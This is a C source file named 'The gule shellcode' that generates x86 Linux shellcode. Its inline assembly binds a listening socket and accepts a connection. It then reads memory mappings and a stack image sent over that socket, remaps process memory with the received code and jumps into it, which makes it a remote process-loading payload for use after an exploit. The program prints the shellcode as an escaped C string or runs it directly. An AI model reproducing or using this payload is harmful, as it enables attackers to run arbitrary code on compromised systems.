#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/resource.h>

char bla[4 * 1024 * 1024]; // this is needed

void info(char *program)
{
  printf("The gule shellcode\nusage:\n  %s [exec]\n", program);
}

int main(int argc, char **argv)
{
  register unsigned long eax __asm__("%eax");
  register unsigned long ebx __asm__("%ebx");
  struct rlimit rl;

  rl.rlim_cur = RLIM_INFINITY;
  rl.rlim_max = RLIM_INFINITY;

  setrlimit(RLIMIT_DATA, &rl);

  info(argv[0]);
  
  eax = 0;
  ebx = 0;
  
  asm(
      // -- BEGIN replace this with leet findsck code -
      " mov $end-start, %eax          \n"
      " mov $start,     %ebx          \n"
      " jmp end                       \n"

      "start:                         \n"
      " xor %eax, %eax                \n"
      " inc %eax                      \n"
      " mov %eax, 12(%esi)            \n"
      " mov %eax, %ebx                \n" // socketcall(SYS_SOCKET,
      " inc %eax                      \n"
      " mov %eax, 8(%esi)             \n"
      " add $0x4, %al                 \n"
      " mov %eax, 16(%esi)            \n" 
      " lea 8(%esi), %ecx             \n"
      " mov $102, %al                 \n" // socketcall
      " int $0x80                     \n"
      " mov %eax, %edx                \n"
      " xor %eax, %eax                \n"

      " movb $0x2, 8(%esi)            \n"
      " movw $0x4141, 10(%esi)        \n"
      " mov  %eax, 12(%esi)           \n"
      " mov  %edx, 17(%esi)           \n"
      " lea  8(%esi), %ecx            \n"
      " mov  %ecx, 21(%esi)           \n"
      " inc  %ebx                     \n" // socketcall(SYS_BIND,
      " mov  %ebx, %ecx               \n"
      " add  $14, %cl                 \n"
      " mov  %ecx, 25(%esi)           \n"
      " lea  17(%esi), %ecx           \n"
      " movb $102, %al                \n" // socketcall
      " int  $0x80                    \n"
      
      " mov  $102, %al                \n" // socketcall
      " inc  %ebx                     \n"
      " inc  %ebx                     \n" // socketcall(SYS_LISTEN,
      " int  $0x80                    \n"
     
      " xor %eax, %eax                \n"
      " inc %ebx                      \n" // socketcall(SYS_ACCEPT,
      " mov %eax, 21(%esi)            \n"
      " mov %eax, 25(%esi)            \n"
      " movb $102, %al                \n" // socketcall
      " int $0x80                     \n"
      // -- END   replace this with leet findsck code --
      
      " mov %eax, 24(%esi)            \n" // store the socket fd in 24(%esi)

      "mappingloop:                   \n"
      
      " movl 24(%esi), %ebx           \n" // read the header 
      " leal (%esi),   %ecx           \n"
      " xor  %edx,     %edx           \n"
      " addb $8,       %dl            \n"
      " xor  %eax,     %eax           \n"
      " addb $3,       %al            \n"
      " int $0x80                     \n"

      " mov 4(%esi),   %ecx           \n"
      " test %ecx,   %ecx             \n" // if(read(..) == 0)
      " jz  mappingloopend            \n"

      " mov  (%esi), %ebx             \n" // munmap the destination
      " mov 4(%esi), %ecx             \n"
      " xor   %eax,  %eax             \n"
      " addb  $91,   %al              \n"
      " int $0x80                     \n"
      
      " xor  %eax,   %eax             \n"
      " movl %eax,20(%esi)            \n"
      " decl %eax                     \n"
      " movl %eax,  16(%esi)          \n"
      " incl %eax                     \n"
      " addb $7,     %al              \n"
      " movl %eax,  8(%esi)           \n" // mmap the destination
      " addb $42-16,    %al           \n"
      " movl %eax, 12(%esi)           \n"
      " mov  %esi,    %ebx            \n"
      " addb $41+16,     %al          \n"
      " int $0x80                     \n"
      " movl %eax,   (%esi)           \n"

      "rd:                            \n"
      " movl 24(%esi), %ebx           \n" // copy source to destination
      " movl   (%esi), %ecx           \n"
      " movl  4(%esi), %edx           \n"
      " xor     %eax,  %eax           \n"
      " addb  $3,      %al            \n"       
      " int     $0x80                 \n"
      " addl  %eax,   (%esi)          \n"
      " subl  %eax,  4(%esi)          \n"
      " mov   4(%esi),%eax            \n"
      " test  %eax,   %eax            \n"
      " jnz   rd                      \n"

      " jmp  mappingloop              \n" 
      "mappingloopend:                \n"

      "stacksetup:                    \n"

      " mov 24(%esi),    %ebx         \n" // read the stack
      " mov $0xbfffff00-88, %ecx      \n"
      " xor   %edx, %edx              \n"
      " addb  $91,  %dl               \n"
      " xor   %eax, %eax              \n"
      " addb  $3,   %al               \n"
      " int $0x80                     \n"



      " mov $0xbfffff00-88, %esp      \n" // setup the stack
      " mov 20(%esp),       %eax      \n"
      
      " push %eax                     \n"
      
      " xor %eax,           %eax      \n" // clean and return ;)
      " xor %ebx,           %ebx      \n"
      " xor %ecx,           %ecx      \n"
      " cdq                           \n"
      " xor %esi,           %esi      \n"
      " xor %edi,           %edi      \n"
      " xor %ebp,           %ebx      \n"
      " ret                           \n"
      
      "end:                           \n"
      
      );

  {
    int t = eax;
    char *s = (char *)ebx;
        
    if(argc == 2)
    {
      char *sh = mmap((void *)0x04090000, t, PROT_EXEC|PROT_WRITE|PROT_WRITE, MAP_FIXED|MAP_SHARED|MAP_ANONYMOUS, 0, 0);
      memcpy(sh, s, t);
      asm("jmp *%0 \n"::"r"(sh));
    }
    else
    {
      int i;
      printf("char shellcode[] = \"");
      for(i = 0;i <= t; i++)
        printf("\\x%.2x", (s[i] & 0x000000FF));
      printf("\";\ntotal length: %i\n", t);
    }
  }
  return 0;
}
